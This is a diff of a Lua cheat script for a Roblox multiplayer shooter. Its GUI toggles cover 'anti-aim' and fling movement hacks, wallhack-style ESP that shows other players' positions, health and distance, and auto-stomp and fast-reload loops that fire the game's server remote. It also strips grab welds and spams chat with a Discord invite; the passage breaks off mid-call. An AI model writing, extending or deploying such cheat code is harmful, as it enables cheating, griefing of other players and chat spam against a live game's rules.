+                   if getgenv().CameraToggleeee == true then
+                   --//Incase Player Dies
+           ws.CurrentCamera.CameraSubject = Camera
+           
+                   --//Tweening The Camera
+                   ts:Create(Camera, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CFrame = (OldPos or CFrame.new(hrp.CFrame.p))}):Play()
+                   else
+                       
+                       --//Changing to hrp
+                       ws.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
+                       end
+           end)
+
+end}) 
+
+
+
+
+   
+
+
+
+
+ 
+getgenv().SpinAntiAim = false 
+getgenv().SpinPower = 200 
+
+ 
+
+getgenv().FallAA = false 
+function FallAA()
+game.Players.LocalPlayer.Character:WaitForChild("Humanoid").StateChanged:Connect(function(alter,poo)
+    if poo == Enum.HumanoidStateType.Freefall == true and getgenv().FallAA == true then
+        wait(0.27)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, -14, 0)
+    end
+end)
+    
+end 
+
+
+
+
+getgenv().VelocityAntiAim = false
+local HipHeight = 3
+local VelocityValue = 80
+
+
+
+   --
+ 
+
+
+
+getgenv().aa = false
+getgenv().BlatantAApowerg = 15 
+function FlingAA()
+    
+     local Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+       
+    while getgenv().aa == true and getgenv().antiaimtoggle == true do
+        task.wait()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(Position) + Vector3.new(math.random(- getgenv().BlatantAApowerg,  getgenv().BlatantAApowerg), math.random(- getgenv().BlatantAApowerg,  getgenv().BlatantAApowerg), math.random(- getgenv().BlatantAApowerg,  getgenv().BlatantAApowerg))) * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
+    end
+
+    
+end 
+
+
+function destroyaa()
+    	        getgenv().SpinAntiAim = false  
+	        getgenv().aa = false
+	        getgenv().StillAA = false 
+          _G.desync = false 
+	        getgenv().VelocityAntiAim = false
+	       
+for i=1,20 do
+wait(0.01)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos * CFrame.new(0,0,0)
+end
+end 
+
+getgenv().StillAA = false 
+function Stillaa()
+local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
+
+while getgenv().StillAA == true do 
+        task.wait()
+        if getgenv().antiaimtoggle == true then 
+    local x  = math.random(-9999,9999)
+    local y  = math.random(-9999,9999)
+    local z  = math.random(-9999,9999)
+game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,y,z) 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos * CFrame.new(0,0,0)
+end 
+end 
+end 
+
+
+getgenv().BlatantAApowerg = 15 
+AntiAims:AddToggle({
+	Name = "Fling",
+	Default = false,
+	Callback = function(v)
+
+
+getgenv().aa = v
+ 
+     local Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+       
+    while getgenv().aa == true do
+        task.wait()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(Position) + Vector3.new(math.random(- getgenv().BlatantAApowerg,  getgenv().BlatantAApowerg), math.random(- getgenv().BlatantAApowerg,  getgenv().BlatantAApowerg), math.random(- getgenv().BlatantAApowerg,  getgenv().BlatantAApowerg))) * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
+    end
+
+    
+end}) 
+
+
+--[[
+Anti Aim Functions
+------------------
+SpinVelAA()
+VelocityAnti()
+Unresolvable()
+FlingAA()
+Stillaa()
+]]
+
+AntiAims:AddSlider({
+	Name = "Power",
+	Min = 0,
+	Max = 35,
+	Default = 15,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "P",
+	Callback = function(a)
+	    getgenv().BlatantAApowerg = a 
+	
+end}) 
+
+
+AntiAims:AddToggle({
+	Name = "Legit AA",
+	Default = false,
+	Callback = function(v)
+	    getgenv().VelocityAntiAim = v 
+	    	    local HipHeight = 2.2
+local VelocityValue = 25
+
+	    while getgenv().VelocityAntiAim == true do
+    task.wait()
+    local OldVel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(OldVel.X, -VelocityValue, OldVel.Z)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(OldVel.X, OldVel.Y, OldVel.Z)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(OldVel.X, -VelocityValue, OldVel.Z)
+    game.Players.LocalPlayer.Character.Humanoid.HipHeight = HipHeight
+   end
+end})
+
+
+
+getgenv().SpinPower = 200 
+AntiAims:AddToggle({
+	Name = "Velocity Spin",
+	Default = false,
+	Callback = function(v)
+	    getgenv().SpinAntiAim = v 
+while getgenv().SpinAntiAim == true do 
+    task.wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,getgenv().SpinPower)
+    task.wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,-getgenv().SpinPower)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(90),0)
+ 
+end 
+	            
+end}) 
+
+AntiAims:AddSlider({
+	Name = "Power",
+	Min = 0,
+	Max = 50,
+	Default = 20,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "P",
+	Callback = function(v)
+	    getgenv().SpinPower = v*10
+end}) 
+
+
+getgenv().FlingRadius = 5
+getgenv().VelocityFlingPower = 200 
+AntiAims:AddToggle({
+	Name = "Velocity Fling",
+	Default = false,
+	Callback = function(v)
+local oldposition = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
+          _G.desync = v 
+          
+          
+          while _G.desync == true do 
+          task.wait()
+
+          local x  = math.random(-getgenv().VelocityFlingPower,getgenv().VelocityFlingPower)
+          local y  = math.random(-getgenv().VelocityFlingPower,getgenv().VelocityFlingPower)
+            local z  = math.random(-getgenv().VelocityFlingPower,getgenv().VelocityFlingPower)
+            local a = math.random(-getgenv().FlingRadius,getgenv().FlingRadius) 
+            local b = math.random(-getgenv().FlingRadius,getgenv().FlingRadius)
+          local c = math.random(-getgenv().FlingRadius,getgenv().FlingRadius)
+
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(x,y,z) 
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldposition * CFrame.new(a,b,c)
+                            
+                            
+end 
+ 
+
+
+end}) 
+
+
+
+AntiAims:AddSlider({
+	Name = "Radius",
+	Min = 0,
+	Max = 45,
+	Default = 15,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "P",
+	Callback = function(v)
+	    getgenv().FlingRadius = v
+end}) 
+
+
+AntiAims:AddSlider({
+	Name = "Fling Power",
+	Min = 0,
+	Max = 100,
+	Default = 20,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "P",
+	Callback = function(v)
+	    getgenv().VelocityFlingPower = v*10
+end}) 
+
+
+AntiAims:AddToggle({
+	Name = "Fake Lag",
+	Default = false,
+	Callback = function(v)
+
+getgenv().FakeLag = v 
+game:GetService("RunService").heartbeat:Connect(function()
+    if getgenv().FakeLag == true then  
+      local  poop = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+wait(0.01)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  poop
+
+
+    end 
+    end)
+end}) 
+
+
+AntiAims:AddToggle({
+	Name = "SlingShot",
+	Default = false,
+	Callback = function(v)
+	    getgenv().SlingShot = v 
+	    while  getgenv().SlingShot == true do 
+	        task.wait()
+	       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, getgenv().SlingShotPower, 0) 
+	   end 
+	    
+end}) 
+
+
+AntiAims:AddSlider({
+	Name = "Slingshot Power",
+	Min = 0,
+	Max = 25,
+	Default = 10,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "P",
+	Callback = function(v)
+	    getgenv().SlingShotPower = v/10
+end}) 
+
+AntiAims:AddToggle({
+	Name = "Reversed",
+	Default = false,
+	Callback = function(v)
+	     _G.moonwalk = v
+            
+            while _G.moonwalk == true do 
+                task.wait()
+            
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame +
+                -game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getgenv().moonwalkspeed
+
+    
+            end 
+	    
+end})
+
+
+AntiAims:AddSlider({
+	Name = "Reversed Power",
+	Min = 0,
+	Max = 100,
+	Default = 52,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "P",
+	Callback = function(v)
+	    getgenv().moonwalkspeed = v/50
+end}) 
+
+local ESP = Visuals:AddSection({
+	Name = "ESP"
+})
+
+ESP:AddToggle({
+	Name = "Enabled",
+	Default = false,
+	Callback = function(v)
+		esp.enabled = v
+	end    
+})
+
+ESP:AddToggle({
+	Name = "Box",
+	Default = false,
+	Callback = function(v)
+		esp.box[1] = v
+	end    
+})
+ESP:AddColorpicker({
+	Name = "Box Colour",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		    esp.box[2]  = Value
+	end	  
+})
+
+ESP:AddToggle({
+	Name = "Box fill",
+	Default = false,
+	Callback = function(v)
+		esp.boxfill[1] = v
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "Box Fill",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		   esp.boxfill[2] = Value
+	end	  
+})
+
+
+
+ESP:AddToggle({
+	Name = "Health bar",
+	Default = false,
+	Callback = function(v)
+		esp.barlayout.health.enabled = v
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "Health Bar Color",
+	Default = Color3.fromRGB(0, 255, 0),
+	Callback = function(Value)
+		        esp.barlayout.health.color2 = Value
+	end	  
+})
+
+ESP:AddToggle({
+	Name = "Name",
+	Default = false,
+	Callback = function(v)
+		esp.textlayout.name.enabled = v
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "Name Colour",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		        esp.textlayout.name.color = Value
+	end	  
+})
+
+ESP:AddToggle({
+	Name = "Distance",
+	Default = false,
+	Callback = function(v)
+		esp.textlayout.distance.enabled = v
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "Distance Color",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		    esp.textlayout.distance.color  = Value
+	end	  
+})
+
+ESP:AddToggle({
+	Name = "Health Number",
+	Default = false,
+	Callback = function(v)
+		esp.textlayout.health.enabled = v
+	end    
+})
+
+
+ESP:AddToggle({
+	Name = "Angles",
+	Default = false,
+	Callback = function(v)
+		    esp.angle[1] = v
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "Angle Colour",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		    esp.angle[2] = Value
+	end	  
+})
+
+ESP:AddToggle({
+	Name = "Arrows",
+	Default = false,
+	Callback = function(v)
+		esp.arrow[1] = v
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "Arrow Colour",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		    esp.arrow[2] = Value
+	end	  
+})
+
+ESP:AddSlider({
+	Name = "Arrows Distance",
+	Min = 0,
+	Max = 100,
+	Default = 30,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = " m",
+	Callback = function(v)
+		esp.arrowradius = v * 10 
+		
+ 
+	end    
+})
+
+ESP:AddToggle({
+	Name = "Outlines",
+	Default = false,
+	Callback = function(v)
+		esp.outline[1] = v
+	end    
+})
+
+
+
+
+
+
+
+ESP:AddToggle({
+	Name = "Team check",
+	Default = false,
+	Callback = function(v)
+		esp.teamcheck = v
+	end    
+})
+
+ESP:AddToggle({
+	Name = "Use display names",
+	Default = false,
+	Callback = function(v)
+		esp.displaynames = v
+	end    
+})
+
+ESP:AddDropdown({
+	Name = "Text Font",
+	Default = "2",
+	Options = {"UI", "Plex", "System", "Monospace"},
+	Callback = function(v)
+        if v == "UI" then
+            esp.textfont = 0
+        elseif v == "Plex" then
+            esp.textfont = 2
+        elseif v == "System" then
+            esp.textfont = 1
+        elseif v == "Monospace" then
+            esp.textfont = 3
+        end
+	end    
+})
+
+ESP:AddDropdown({
+	Name = "Healthbar Position",
+	Default = "2",
+	Options = {"right", "left", "bottom", "top"},
+	Callback = function(v)
+		esp.barlayout.health.pos = v
+	end    
+})
+
+ESP:AddDropdown({
+	Name = "Name Position",
+	Default = "4",
+	Options = {"right", "left", "bottom", "top"},
+	Callback = function(v)
+		esp.textlayout.name.pos = v
+	end    
+})
+
+ESP:AddDropdown({
+	Name = "Health Position",
+	Default = "2",
+	Options = {"right", "left", "bottom", "top"},
+	Callback = function(v)
+		esp.barlayout.health.pos = v
+	end    
+})
+
+ESP:AddDropdown({
+	Name = "Distance Position",
+	Default = "3",
+	Options = {"right", "left", "bottom", "top"},
+	Callback = function(v)
+		esp.textlayout.distance.pos = v
+	end    
+})
+
+ESP:AddToggle({
+	Name = "Limit draw distance",
+	Default = false,
+	Callback = function(v)
+		esp.limitdistance = v
+	end    
+})
+
+
+ESP:AddSlider({
+	Name = "Max Distance",
+	Min = 0,
+	Max = 12000,
+	Default = 500,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = " m",
+	Callback = function(v)
+		esp.maxdistance = v
+		
+ 
+	end    
+})
+
+ESP:AddSlider({
+	Name = "Text Size",
+	Min = 0,
+	Max = 30,
+	Default = 13,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = " px",
+	Callback = function(v)
+		esp.textsize = v
+	end    
+})
+
+ESP:AddToggle({
+	Name = "Rainbow All",
+	Default = false,
+	Callback = function(v)
+		    _G.rainboww  = v 
+    
+    while _G.rainboww == true do 
+        task.wait()
+     esp.arrow[2] = chromaColor
+     esp.angle[2] = chromaColor
+       esp.textlayout.distance.color  = chromaColor
+         esp.textlayout.distance.color  = chromaColor
+          esp.textlayout.name.color = chromaColor
+          esp.barlayout.health.color2 = chromaColor
+          esp.boxfill[2] = chromaColor
+           esp.box[2]  = chromaColor
+           
+    end 
+	end    
+})
+
+ESP:AddColorpicker({
+	Name = "All Colour",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		    esp.arrow[2] = Value
+     esp.angle[2] = Value
+       esp.textlayout.distance.color  = Value
+         esp.textlayout.distance.color  = Value
+          esp.textlayout.name.color = Value
+          esp.barlayout.health.color2 = Value
+          esp.boxfill[2] = Value
+           esp.box[2]  = Value
+	end	  
+})
+
+
+local ColorCorrectionEffect = Instance.new("ColorCorrectionEffect")
+ColorCorrectionEffect.Brightness = 0
+ColorCorrectionEffect.Contrast = 0
+ColorCorrectionEffect.Enabled = false
+ColorCorrectionEffect.Saturation = 0
+ColorCorrectionEffect.TintColor = Color3.fromRGB(255, 255, 255)
+ColorCorrectionEffect.Parent = game:GetService("Lighting")
+
+
+local skybox = Instance.new("Sky")
+skybox.Parent = game.Lighting
+skybox.SkyboxBk = "rbxassetid://600830446" 
+skybox.SkyboxDn = "rbxassetid://600831635" 
+skybox.SkyboxFt = "rbxassetid://600832720" 
+skybox.SkyboxLf = "rbxassetid://600886090" 
+skybox.SkyboxRt = "rbxassetid://600833862" 
+skybox.SkyboxUp = "rbxassetid://600835177" 
+
+
+local worldeffects = Visuals:AddSection({
+	Name = "World Effects"
+})
+
+worldeffects:AddToggle({
+	Name = "Low GFX",
+	Callback = function(v)
+	    if v == true then 
+	        game:GetService("Lighting").GlobalShadows = false 
+	    end 
+   
+   	    if v == false then 
+	        game:GetService("Lighting").GlobalShadows = true 
+	    end 
+   
+   
+end}) 
+
+
+worldeffects:AddToggle({
+	Name = "Custom SkyBox",
+	Callback = function(v)
+	    getgenv().CustomSkyBox = v 
+	    
+	    game:GetService("RunService").RenderStepped:Connect(function()
+	        if getgenv().CustomSkyBox == true then 
+        game:GetService("Lighting").TimeOfDay = "12:00:00"
+end 
+    end)
+ 
+
+end}) 
+
+worldeffects:AddDropdown({
+	Name = "Material",
+	Default = "2",
+	Options = {"Normal", "DoomSpire", "CatGirl", "Vibe", "Blue Aurora"},
+	Callback = function(v)
+getgenv().CustomSky = v 
+
+if getgenv().CustomSky == "Normal" then 
+    skybox.SkyboxBk = "rbxassetid://600830446" 
+skybox.SkyboxDn = "rbxassetid://600831635" 
+skybox.SkyboxFt = "rbxassetid://600832720" 
+skybox.SkyboxLf = "rbxassetid://600886090" 
+skybox.SkyboxRt = "rbxassetid://600833862" 
+skybox.SkyboxUp = "rbxassetid://600835177" 
+end 
+
+
+if getgenv().CustomSky == "DoomSpire" then 
+    skybox.SkyboxBk = "rbxassetid://6050664592" 
+skybox.SkyboxDn = "rbxassetid://6050648475" 
+skybox.SkyboxFt = "rbxassetid://6050644331" 
+skybox.SkyboxLf = "rbxassetid://6050649245" 
+skybox.SkyboxRt = "rbxassetid://6050649718" 
+skybox.SkyboxUp = "rbxassetid://6050650083"  
+end 
+
+if getgenv().CustomSky == "CatGirl" then 
+        skybox.SkyboxBk = "rbxassetid://444167615" 
+skybox.SkyboxDn = "rbxassetid://444167615" 
+skybox.SkyboxFt = "rbxassetid://444167615" 
+skybox.SkyboxLf = "rbxassetid://444167615" 
+skybox.SkyboxRt = "rbxassetid://444167615" 
+skybox.SkyboxUp = "rbxassetid://444167615"  
+end 
+
+if getgenv().CustomSky == "Vibe" then 
+skybox.SkyboxBk = "rbxassetid://1417494030" 
+skybox.SkyboxDn = "rbxassetid://1417494146" 
+skybox.SkyboxFt = "rbxassetid://1417494253" 
+skybox.SkyboxLf = "rbxassetid://1417494402" 
+skybox.SkyboxRt = "rbxassetid://1417494499" 
+skybox.SkyboxUp = "rbxassetid://1417494643"  
+end 
+
+
+if getgenv().CustomSky == "Blue Aurora" then 
+skybox.SkyboxBk = "rbxassetid://12064107" 
+skybox.SkyboxDn = "rbxassetid://12064152" 
+skybox.SkyboxFt = "rbxassetid://12064121" 
+skybox.SkyboxLf = "rbxassetid://12063984" 
+skybox.SkyboxRt = "rbxassetid://12064115" 
+skybox.SkyboxUp = "rbxassetid://12064131"  
+end 
+
+end}) 
+
+worldeffects:AddToggle({
+	Name = "World Effects",
+	Default = false,
+	Callback = function(v)
+		_G.worldeffects = v 
+		
+					    if _G.worldeffects == true then 
+	        ColorCorrectionEffect.Enabled = true
+
+					    end
+    
+    					    if _G.worldeffects == false then 
+	        ColorCorrectionEffect.Enabled = false
+    game:GetService("Lighting").ColorCorrection.TintColor = Color3.fromRGB(255, 255, 255)
+  game:GetService("Lighting").FogColor = Color3.new(0.392157,0.341176,0.282353)
+    game:GetService("Lighting").OutdoorAmbient = Color3.new(0.596078,0.596078,0.572549)
+
+	    end
+	end    
+})
+
+worldeffects:AddColorpicker({
+	Name = "Ambient",
+	Default = Color3.fromRGB(0, 255, 0),
+	Callback = function(Value)
+	    if _G.worldeffects == true then 
+	            game:GetService("Lighting").OutdoorAmbient = Value
+	    end 
+	end	  
+})
+
+worldeffects:AddColorpicker({
+	Name = "Tint",
+	Default = Color3.fromRGB(0, 255, 0),
+	Callback = function(Value)
+	    	    if _G.worldeffects == true then 
+	    	        game:GetService("Lighting").ColorCorrection.TintColor = Value
+	    end 
+	end	  
+})
+
+worldeffects:AddColorpicker({
+	Name = "Shadows",
+	Default = Color3.fromRGB(0, 255, 0),
+	Callback = function(Value)
+	    	    if _G.worldeffects == true then 
+	      game:GetService("Lighting").FogColor = Value
+
+	    end 
+	end	  
+})
+
+worldeffects:AddSlider({
+	Name = "Saturation",
+	Min = 0,
+	Max = 10,
+	Default = 0,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "",
+	Callback = function(v)
+							    if _G.worldeffects == true then 
+	        
+ColorCorrectionEffect.Saturation = v/5
+	    end
+	end    
+})
+
+
+local AnimationDances = Animations:AddSection({
+	Name = "Dances"
+})
+
+Animations:AddToggle({
+	Name = "Floss",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://5917459365"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+Animations:AddToggle({
+	Name = "BreakDance",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://5915648917"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+
+Animations:AddToggle({
+	Name = "Monkey",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://3333499508"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+Animations:AddToggle({
+	Name = "Tilt",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://3334538554"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+Animations:AddToggle({
+	Name = "Clapping",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://5915693819"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+
+
+
+Animations:AddToggle({
+	Name = "GodLike",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://3337994105"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+
+Animations:AddToggle({
+	Name = "Old Town Road",
+	Default = false,
+	Callback = function(v)
+
+local Dance = Instance.new("Animation")
+Dance.AnimationId = "rbxassetid://5937560570"
+getgenv().DanceAnimation = v 
+        if getgenv().DanceAnimation == true then
+            LoadedAnim = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Dance)
+            LoadedAnim:Play()
+            end 
+        if getgenv().DanceAnimation == false then 
+          pcall(function()
+            LoadedAnim:Stop()
+        end)
+end 
+ 
+end}) 
+
+
+
+local AnimationOther = Animations:AddSection({
+	Name = "Other"
+})
+
+AnimationOther:AddToggle({
+	Name = "Crouch Anim",
+	Callback = function(v)
+_G.crouchanimation = v 
+
+if _G.crouchanimation == true then 
+local a = game:GetService("ReplicatedStorage").Animations.Crouch
+game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(a):Play()
+end 
+
+if _G.crouchanimation == false then 
+local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
+ 
+local AnimationTracks = humanoid:GetPlayingAnimationTracks()
+ 
+for i, track in pairs (AnimationTracks) do
+	track:Stop()
+end
+end 
+
+end}) 
+
+
+AnimationOther:AddToggle({
+	Name = "Disable Animations",
+	Callback = function(v)
+	    game.Players.LocalPlayer.Character.Animate.Disabled = v 
+end}) 
+
+
+AnimationOther:AddToggle({
+	Name = "Auto Rotation",
+	Default = true,
+	Callback = function(v)
+	    game.Players.LocalPlayer.Character.Humanoid.AutoRotate = v 
+end}) 
+
+
+
+
+Misc:AddButton({
+	Name = "Rejoin",
+	Callback = function()
+      		                game:GetService("TeleportService"):Teleport(game.PlaceId)
+  	end    
+})
+
+Misc:AddToggle({
+	Name = "Auto Stomp",
+	Default = false,
+	Callback = function(v)
+	    _G.autostomp = v
+while _G.autostomp == true do
+    task.wait()
+local args = {
+    [1] = "Stomp"
+}
+
+game:GetService("ReplicatedStorage").MainRemote:FireServer(unpack(args))
+end
+end}) 
+
+
+Misc:AddToggle({
+	Name = "Fast Shooting DB",
+	Default = false,
+	Callback = function(v)
+	   
+getgenv().FastDB = v
+
+game:GetService("RunService").RenderStepped:Connect(function()   
+   if game:GetService("Players").LocalPlayer.Information.Armory["[Double Barrel SG]"].Ammo.Normal.Value == 1 and getgenv().FastDB == true then 
+local args = {
+    [1] = "Reload"
+}
+
+game:GetService("ReplicatedStorage").MainRemote:FireServer(unpack(args))
+
+    end 
+end) 
+
+
+end}) 
+
+Misc:AddToggle({
+	Name = "Auto Reload",
+	Default = false,
+	Callback = function(v)
+
+end}) 
+
+
+Misc:AddToggle({
+	Name = "Anti Grab",
+	Default = false,
+	Callback = function(v)
+	     _G.antigrab = v
+    while _G.antigrab == true do    
+    wait() 
+        local GC = game.Players.LocalPlayer.Character:FindFirstChild("WELD_GRAB")
+                        if GC then
+                            GC:Destroy()
+                            wait(0.02)
+                            game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid').Sit = true
+                        end
+                        end
+end}) 
+
+Misc:AddToggle({
+	Name = "Kill Carry",
+	Default = false,
+	Callback = function(v)
+	    _G.killcarry = v
+    
+        while _G.killcarry == true do 
+            wait()
+            if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("I_LOADED_I") and game.Players.LocalPlayer.Character:FindFirstChild("I_LOADED_I")['K.O'].Value == true and game.Players.LocalPlayer.Character:FindFirstChild("WELD_GRAB") then
+                game.Players.LocalPlayer.Character.Head.NeckRigAttachment:Destroy()
+          game.Players.LocalPlayer.Character.Head.FaceFrontAttachment:Destroy()
+          game.Players.LocalPlayer.Character.Head.HatAttachment:Destroy()
+          game.Players.LocalPlayer.Character.Head.HairAttachment:Destroy()
+          game.Players.LocalPlayer.Character.Head.FaceCenterAttachment:Destroy()
+          game.Players.LocalPlayer.Character.Head.Neck:Destroy()
+          game.Players.LocalPlayer.Character.Head.Head:Destroy()
+          game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy()
+       end
+    end 
+         
+end}) 
+
+
+Misc:AddToggle({
+	Name = "Disable seats",
+	Default = false,
+	Callback = function(v)
+	     if v == true then
+        for i,v in pairs(game.Workspace:GetDescendants()) do
+            if v:IsA("Seat") then
+                v.Disabled = true
+            end
+        end 
+    end 
+   
+
+    if v == false then 
+        for i,v in pairs(game.Workspace:GetDescendants()) do
+            if v:IsA("Seat") then
+                v.Disabled = true
+            end
+        end 
+    end 
+end}) 
+
+Misc:AddButton({
+	Name = "Anonymous",
+	Callback = function()
+      		                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-35,0)
+wait(1)
+
+        local clickdetector = game:GetService("Workspace").Ignored.Shop.Others["[Mask] - $25"].ClickDetector
+        local tween_s = game:service"TweenService";
+        local info = TweenInfo.new(5,Enum.EasingStyle.Quad);
+        function tp(...)
+           local tic_k = tick();
+           local params = {...};
+           local cframe = CFrame.new(params[1],params[2],params[3]);
+           local tween,err = pcall(function()
+               local tween = tween_s:Create(game:service"Players".LocalPlayer.Character["HumanoidRootPart"],info,{CFrame=cframe});
+               tween:Play();
+           end)
+           if not tween then return err end
+        end
+        tp(-245, 331, -79); --CFrame.new(-245, 331, -79)
+wait(7)
+fireclickdetector(clickdetector)
+wait(0.1)
+game.Players.LocalPlayer.Backpack["[Mask]"].Parent = game.Players.LocalPlayer.Character
+wait(0.1)
+game.Players.LocalPlayer.Character["[Mask]"]:Activate()
+wait(0.1)
+game.Players.LocalPlayer.Character.Mask:Destroy()
+wait(0.1)
+for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do
+   if v:IsA('Accessory') or v:IsA('Shirt') or v:IsA('Pants') then
+       v:Destroy()
+   end
+end
+
+
+
+        
+  	end    
+})
+
+Misc:AddToggle({
+	Name = "Shit Talk",
+	Default = false,
+	Callback = function(v)
+	    _G.shittalk = v
+
+while _G.shittalk == true do 
+    task.wait(2)
+    
+    if _G.shittalkpreset == "Spam Discord" then 
+     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                "gg/crimskid",
+                "All"
+            )
+    end 
+ 
+    if _G.shittalkpreset == "Advertise" then 
+        task.wait(1)
+ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
